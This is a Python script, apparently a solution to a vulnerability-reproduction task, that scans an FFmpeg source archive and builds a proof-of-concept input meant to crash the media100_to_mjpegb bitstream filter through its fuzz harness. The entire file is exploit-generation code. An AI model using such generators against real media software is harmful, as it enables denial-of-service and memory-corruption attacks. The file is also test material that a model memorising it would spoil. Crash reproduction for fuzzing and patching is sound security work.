import tarfile
import re
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        DEFAULT_LEN = 1025
        MAX_LEN = 5000
        DEFAULT_INDEX = 0

        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return b"\x00" * DEFAULT_LEN

        members = tf.getmembers()

        bsf_fuzzer_content = None
        bsf_fuzzer_score = -1

        bsf_list_content = None
        potential_list_files = []

        # First pass: find BSF fuzzer and possible BSF list file
        for m in members:
            if not m.isfile():
                continue
            name = m.name
            if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp")):
                continue
            if m.size > 2_000_000:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data_bytes = f.read()
            except Exception:
                continue
            try:
                data = data_bytes.decode("utf-8", errors="ignore")
            except Exception:
                continue

            lname = name.lower()

            # Detect BSF-related fuzzer
            if "LLVMFuzzerTestOneInput" in data:
                if "AVBSFContext" in data or "av_bsf_" in data or "AVBitStreamFilter" in data:
                    score = 0
                    if "bsf" in lname or "bitstream" in lname:
                        score += 2
                    if "ffmpeg" in lname:
                        score += 1
                    if bsf_fuzzer_content is None or score > bsf_fuzzer_score:
                        bsf_fuzzer_score = score
                        bsf_fuzzer_content = data

            # Direct hit: list file referencing media100_to_mjpegb
            if "ff_media100_to_mjpegb_bsf" in data and "&ff_media100_to_mjpegb_bsf" in data:
                bsf_list_content = data

            # General candidate list files: many &ff_*_bsf entries
            if "&ff_" in data and "_bsf" in data:
                count = len(re.findall(r"&ff_[A-Za-z0-9_]+_bsf", data))
                if count > 0:
                    potential_list_files.append((count, data))

        # Fallback: choose file with most &ff_*_bsf entries as BSF list
        if bsf_list_content is None and potential_list_files:
            potential_list_files.sort(key=lambda x: x[0], reverse=True)
            bsf_list_content = potential_list_files[0][1]

        # Parse BSF list to get index of media100_to_mjpegb
        bsf_index = DEFAULT_INDEX
        if bsf_list_content is not None:
            content = bsf_list_content
            stack = []
            best_seg = None
            best_count = 0
            for i, ch in enumerate(content):
                if ch == "{":
                    stack.append(i)
                elif ch == "}" and stack:
                    start = stack.pop()
                    if not stack:
                        seg = content[start : i + 1]
                        cnt = seg.count("_bsf")
                        if cnt > best_count:
                            best_count = cnt
                            best_seg = seg
            if best_seg is not None:
                names = [m.group(1) for m in re.finditer(r"ff_([A-Za-z0-9_]+)_bsf", best_seg)]
                for idx, nm in enumerate(names):
                    if "media100_to_mjpegb" in nm:
                        bsf_index = idx
                        break

        # Determine minimal size requirement from fuzzer code
        min_size = 8
        if bsf_fuzzer_content is not None:
            sizes = []
            for m in re.finditer(r"if\s*\(\s*size\s*<\s*(\d+)\s*\)", bsf_fuzzer_content):
                try:
                    sizes.append(int(m.group(1)))
                except Exception:
                    pass
            for m in re.finditer(r"if\s*\(\s*size\s*<=\s*(\d+)\s*\)", bsf_fuzzer_content):
                try:
                    sizes.append(int(m.group(1)) + 1)
                except Exception:
                    pass
            if sizes:
                smax = max(sizes)
                if smax + 1 > min_size:
                    min_size = smax + 1

        total_len = max(DEFAULT_LEN, min_size + 100)
        if total_len > MAX_LEN:
            total_len = MAX_LEN

        # Determine endianness for header integers (default little-endian)
        endian = "<"
        if bsf_fuzzer_content is not None:
            if "AV_RB32" in bsf_fuzzer_content and "AV_RL32" not in bsf_fuzzer_content:
                endian = ">"

        val = bsf_index & 0xFFFFFFFF
        if endian == "<":
            iv = struct.pack("<I", val)
        else:
            iv = struct.pack(">I", val)

        # Use two identical 32-bit integers: one likely for decoder id, one for BSF id
        header = iv + iv
        if total_len < len(header) + 1:
            total_len = len(header) + 1

        rem = total_len - len(header)
        payload = bytearray(rem)
        for i in range(rem):
            payload[i] = (i * 7 + 13) & 0xFF

        poc = header + bytes(payload)
        return poc
